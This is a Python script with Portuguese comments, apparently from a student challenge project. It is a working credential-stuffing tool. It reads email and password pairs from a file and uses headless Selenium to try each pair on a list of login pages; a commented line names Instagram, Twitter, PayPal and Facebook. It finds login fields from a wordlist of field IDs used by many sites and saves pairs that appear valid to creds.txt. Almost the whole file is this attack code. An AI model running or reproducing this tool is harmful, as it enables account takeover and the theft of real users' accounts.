import requests
from bs4 import BeautifulSoup
import re
import time
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import os


wlLogin = ['username', 'login', 'Name', 'Email', 'mail', 'Username', 'User', 'user',"user_login","email","lm-login-input","rcmloginuser","identifierId","whsOnd zHQkBf","i0116","form-control ltr_override input ext-input text-box ext-text-box","login_username","loginMain","username","user","login_field","user_id","signin-form_login","usernameModal","login-username","EmailPage-EmailField","account_name_text_field","iptLgnPlnID","loginName","login_candidatos_form_usuario","E-mail ou CPF","login","vSIS_USUARIOID","Email","edit-email","j_username","UserNameLoginMobile","user_email","id_email","TextLogin","ctl00_cphPrincipal_txtLogin","loginid1","userName","userNameInput","UserID","userId-input","login-email","USER","inputEmail","txtUsername","txtEmailAddress","userNameId","txtEmail","user-id","ctl00_BaseContent_msl_txtUsername","okta-signin-username","usuario","vGERUSULGN","log","txtLogin"]
wlSenha = ['Passwd', 'passwd', 'senha','Senha', 'ass', 'Pass',"rcmloginpwd","lm-login-input lm-input-toggle-pass","whsOnd zHQkBf","i0118","form-control input ext-input text-box ext-text-box","secretkey","loginPassword","password","senha","signin-form_password","passwordModal","login_password","password-input","PasswordPage-PasswordField","password_text_field","iptLgnPlnPD","login_candidatos_form_senha","Senha","vSIS_USUARIOID","Password","edit-senha","j_password","PasswordLoginMobile","user_password","id_password","TextSenha","ctl00_cphPrincipal_txtSenha","pass1","passwordInput","currentpassword","Password2","login-password","PASSWORD","txtPassword","passwordId","ctl00_BaseContent_mslp_tbxPassword","password-password","vGERUSUSNH","inputPassword"]

tamwlLogin = len(wlLogin)
tamwlSenha = len(wlSenha)

direct = open('txt/DIRECT.txt')
linkLogin = direct.readlines()#,'https://minhaconta2.cielo.com.br/login/', 'https://login.cpbedu.me/','https://www.instagram.com/accounts/login/?hl=pt-br',  'https://twitter.com/login?lang=pt', 'https://www.paypal.com/br/signin', 'https://www.facebook.com/login']
def search_InputLogin(soup): # Procura Input Login no HTML Puro
    try:
        inputLogin = soup.html.find_all('input')
        inputLogin = str(inputLogin).split(',') 
        inputLogin = [s for s in inputLogin if not "hidden" in s] # Pega somente o ID do input -> id="exemplo"
        inputLogin = str(inputLogin).split(' ') 
        inputLogin = [s for s in inputLogin if "id=" in s] # Pega somente o ID do input -> id="exemplo"
        inputLogin = str(inputLogin).split('"') 

        for x in range(tamwlLogin):
            idCerto = [s for s in inputLogin if wlLogin[x] in s]

            if idCerto != []:
                break
            x = x + 1
            
        return idCerto[0] # Retorna apenas o ID do Login
    except Exception:
        pass

def search_InputSenha(soup): # Procura Input Senha no HTML Puro
    try:
        inputSenha = soup.html.find_all('input')
        inputSenha = str(inputSenha).split(',') 
        inputSenha = [s for s in inputSenha if not "hidden" in s] # Pega somente o ID do input -> id="exemplo"
        inputSenha = str(inputSenha).split(' ') 
        inputSenha = [s for s in inputSenha if "id=" in s] # Pega somente o ID do input -> id="exemplo"
        inputSenha = str(inputSenha).split('"') 
        for x in range(tamwlSenha):

            idCerto = [s for s in inputSenha if wlSenha[x] in s]
            if idCerto != []:
                break
            x = x + 1
        return idCerto[0] # Retorna apenas o ID da Senha
    except Exception as e:
        pass

def javascript(driver): # Captura o Javascript da página
    try:
        time.sleep(5)
        search_form = driver.find_element(By.TAG_NAME, "body") # Captura todo o javascript
        html = search_form.get_attribute('outerHTML')
        javascript = BeautifulSoup(html, 'html.parser') # Parseia o código HTML
        return javascript # Retorna o Javascript
    except Exception as e:
        pass

def search_IdLoginJavascript(driver): # Procura Input Login no HTML com Javascript
    try:
        javascriptBF = javascript(driver)
        inputLogin = javascriptBF.find_all('input')
        inputLogin = str(inputLogin).split(',') 
        inputLogin = [s for s in inputLogin if not "hidden" in s] # Pega somente o ID do input -> id="exemplo"
        inputLogin = str(inputLogin).split(' ') 
        inputLogin = [s for s in inputLogin if "id=" in s] # Pega somente o ID do input -> id="exemplo"
        inputLogin = str(inputLogin).split('"') 
        for x in range(tamwlLogin):
            idCerto = [s for s in inputLogin if wlLogin[x] in s]
            if idCerto != []:
                break
            x = x + 1
        return idCerto[0] # Retorna apenas o ID do Login (Do Javascript)
    except Exception as e:
        pass

def search_IdPasswdJavascript(driver): # Procura Input Senha no HTML com Javascript
    try:
        javascriptBF = javascript(driver)
        inputSenha = javascriptBF.find_all('input')
        inputSenha = str(inputSenha).split(',') 
        inputSenha = [s for s in inputSenha if not "hidden" in s] # Pega somente o ID do input -> id="exemplo"
        inputSenha = str(inputSenha).split(' ') 
        inputSenha = [s for s in inputSenha if "id=" in s] # Pega somente o ID do input -> id="exemplo"
        inputSenha = str(inputSenha).split('"') 
        for x in range(tamwlSenha):
            idCerto = [s for s in inputSenha if wlSenha[x] in s]
            if idCerto != []:
                break
            x = x + 1
        return idCerto[0] # Retorna apenas o ID da Senha (Do Javascript)
    except Exception as e:
        pass

def search_NameLoginJavascript(driver): # Procura Input Login no HTML com Javascript
    try:
        javascriptBF = javascript(driver)
        inputLogin = javascriptBF.find_all('input')
        inputLogin = str(inputLogin).split(',') 
        inputLogin = [s for s in inputLogin if not "hidden" in s] # Pega somente o ID do input -> id="exemplo"
        inputLogin = str(inputLogin).split(' ') 
        inputLogin = [s for s in inputLogin if "name=" in s] # Pega somente o ID do input -> id="exemplo"
        inputLogin = str(inputLogin).split('"') 
        for x in range(tamwlLogin):
            #print(x, " - x -  ", wlLogin[x])
            nameCerto = [s for s in inputLogin if wlLogin[x] in s]
            if nameCerto != []:
                #print(nameCerto)
                break
            x = x + 1
        return nameCerto[0] # Retorna apenas o NAME do Login (Do Javascript)
    except Exception as e:
        pass

def search_NamePasswdJavascript(driver): # Procura Input Senha no HTML com Javascript
    try:
        javascriptBF = javascript(driver)
        inputSenha = javascriptBF.find_all('input')
        inputSenha = str(inputSenha).split(',') 
        inputSenha = [s for s in inputSenha if not "hidden" in s] # Pega somente o ID do input -> id="exemplo"
        inputSenha = str(inputSenha).split(' ') 
        inputSenha = [s for s in inputSenha if "name=" in s] # Pega somente o ID do input -> id="exemplo"
        inputSenha = str(inputSenha).split('"') 
        for x in range(tamwlSenha):
            nameCerto = [s for s in inputSenha if wlSenha[x] in s]
            if nameCerto != []:
                break
            x = x + 1
        return nameCerto[0] # Retorna apenas o NAME da Senha (Do Javascript)
    except Exception as e:
        pass

def write_Login_id(id, driver, email): # Escreve o Login e dá Enter (Caso a página utilize Javascript)
    try:
        idLogin = driver.find_element_by_id(id) # Procura o campo de Login utilizando o selenium
        idLogin.send_keys(email) # Escreve o email no input
        idLogin.send_keys(Keys.ENTER) # Dá enter
        return True
    except Exception as e:
        pass

def write_raw_Login_id(id, driver, email): # Escreve o Login e não dá Enter (Caso a página não utilize Javascript)
    try:
        idLogin = driver.find_element_by_id(id) # Procura o campo de Login utilizando o selenium
        idLogin.send_keys(email) # Escreve o email no input
        return True
    except Exception as e:
        pass

def write_Pass_id(id, driver, senha): # Escreve o login e dá Enter (Com ou sem Javascript)
    try:
        idSenha = driver.find_element_by_id(id) # Procura o campo de Senha utilizando o selenium
        idSenha.send_keys(senha) # Escreve a senha no input
        idSenha.send_keys(Keys.ENTER) # Dá enter
        return True
    except Exception as e:
        #print('Falha na função write_Pass_id ', e)
        pass

def write_Login_name(name, driver, email): # Escreve o Login e dá Enter (Caso a página utilize Javascript)
    try:
        idLogin = driver.find_element_by_name(name) # Procura o campo de Login utilizando o selenium
        idLogin.send_keys(email) # Escreve o email no input
        idLogin.send_keys(Keys.ENTER) # Dá enter
        return True
    except Exception as e:
        #print('Falha na função write_Login_name ', e)
        pass

def write_raw_Login_name(name, driver, email): # Escreve o Login e não dá Enter (Caso a página não utilize Javascript)
    try:
        idLogin = driver.find_element_by_name(name) # Procura o campo de Login utilizando o selenium
        idLogin.send_keys(email) # Escreve o email no input
        return True
    except Exception as e:
        pass

def write_Pass_name(name, driver, senha): # Escreve o login e dá Enter (Com ou sem Javascript)
    try:
        idSenha = driver.find_element_by_name(name) # Procura o campo de Senha utilizando o selenium
        idSenha.send_keys(senha) # Escreve a senha no input
        idSenha.send_keys(Keys.ENTER) # Dá enter
        return True
    except Exception as e:
        pass
def valida_IdLogin(id, driver):
    javascriptVld = javascript(driver)
    validaIDLogin = javascriptVld.find('input', attrs={'id' : id})
    return validaIDLogin

def valida_IdPasswd(id, driver):
    javascriptVld = javascript(driver)
    validaIDPasswd = javascriptVld.find('input', attrs={'id' : id})
    return validaIDPasswd

def valida_NameLogin(id, driver):
    javascriptVld = javascript(driver)
    validaNameLogin = javascriptVld.find('input', attrs={'name' : id})
    return validaNameLogin

def valida_NamePasswd(id, driver):
    javascriptVld = javascript(driver)
    validaNamePasswd = javascriptVld.find('input', attrs={'name' : id})
    return validaNamePasswd



def validar():
    print("\033[1;32m╠═══════════════════════════════════════════════════════════╣")
    print("\033[1;32m║             \033[1;33m Iniciando processo de validação!             \033[1;32m║")
    print("\033[1;32m╠═══════════════════════════════════════════════════════════╣")
    file = open("/home/dante0x41/Desktop/challenge/Challenge_Fiap-master/txt/senhas.txt", "r")
    lines = file.readlines()
    for line in lines:
        try:
            email, senha = line.split(";")
            #print("Email >> ", email)
            #print("Senha >> ", senha)
            for i in range(len(linkLogin)):
                #print(i)
                option = Options()
                option.headless = True
                driver = webdriver.Chrome(executable_path=('/home/dante0x41/Desktop/challenge/Challenge_Fiap-master/chromedriver'), options=option)

                driver.get(linkLogin[i])
                time.sleep(5)

                user_agent = {'User-agent': 'Mozilla/5.0'}
                urlLogin = requests.get(linkLogin[i], headers=user_agent)
                soup = BeautifulSoup(urlLogin.text, features="lxml")

                rawIDLogin = search_InputLogin(soup)
                rawIDSenha = search_InputSenha(soup)
            
                if rawIDLogin != None and rawIDSenha != None:
                    write_raw_Login_id(rawIDLogin, driver, email)
                    write_Pass_id(rawIDSenha, driver, senha)
                    time.sleep(4)
                elif rawIDLogin == None and rawIDSenha == None:
                    javaIDLogin = search_IdLoginJavascript(driver)
                    if javaIDLogin == None:
                        javaNameLogin = search_NameLoginJavascript(driver)
                        write_Login_name(javaNameLogin, driver, email)
                        javaNameSenha = search_NamePasswdJavascript(driver)
                        write_Pass_name(javaNameSenha, driver, senha)
                        time.sleep(4)
                        if javaNameLogin == None:
                            linkLogin.pop(i)
                            driver.quit()
                    elif javaIDLogin != None:

                        write_Login_id(javaIDLogin, driver, email)
                        javaIDSenha = search_IdPasswdJavascript(driver)
                        write_Pass_id(javaIDSenha, driver, senha)
                        time.sleep(4)

                print("\033[1;32m╠═══════════════════════════════════════════════════════════╣")
                print("\033[1;32m║     \033[1;33mVerificando a validação, aguarde alguns instantes!    \033[1;32m║")
                print("\033[1;32m╠═══════════════════════════════════════════════════════════╣")
                time.sleep(5)
                
                if rawIDLogin != None and rawIDSenha != None:
                    validaIdLogin = valida_IdLogin(rawIDLogin, driver)
                    validaIdSenha = valida_IdPasswd(rawIDSenha, driver)


                    if validaIdLogin == None and validaIdSenha == None:
                        print("\033[1;32m╠═══════════════════════════════════════════════════════════╣")
                        print("\033[1;32m║                  \033[1;33mEMAIL VÁLIDO ENCONTRADO!                 \033[1;32m║")
                        print("\033[1;32m╠═══════════════════════════════════════════════════════════╣") 
                        creds2 = open('txt/creds.txt', 'w')
                        creds2.write(email+";"+senha)
                        creds2.close()
                    else:
                        pass

                elif javaIDLogin != None and javaIDSenha != None:
                    validaIdLogin = valida_IdLogin(javaIDLogin, driver)
                    validaIdSenha = valida_IdPasswd(javaIDSenha, driver)


                    if validaIdLogin == None and validaIdSenha == None:
                        print("\033[1;32m╠═══════════════════════════════════════════════════════════╣")
                        print("\033[1;32m║                  \033[1;33mEMAIL VÁLIDO ENCONTRADO!                 \033[1;32m║")
                        print("\033[1;32m╠═══════════════════════════════════════════════════════════╣") 
                        creds1 = open('txt/creds.txt', 'w')
                        creds1.write(email+";"+senha)
                        creds1.close()
                    else:
                        pass

                elif javaNameLogin != None and javaNameSenha != None:
                    validaNameLogin = valida_NameLogin(javaNameLogin, driver)
                    validaNameSenha = valida_NamePasswd(javaNameSenha, driver)


                    if validaNameLogin == None and validaNameSenha == None:
                        print("\033[1;32m╠═══════════════════════════════════════════════════════════╣")
                        print("\033[1;32m║                  \033[1;33mEMAIL VÁLIDO ENCONTRADO!                 \033[1;32m║")
                        print("\033[1;32m╠═══════════════════════════════════════════════════════════╣") 
                        creds = open('txt/creds.txt', 'w')
                        creds.write(email+";"+senha)
                        creds.close()
                    else:
                        pass


                i = i + 1
                driver.quit()
        except:
            pass
    
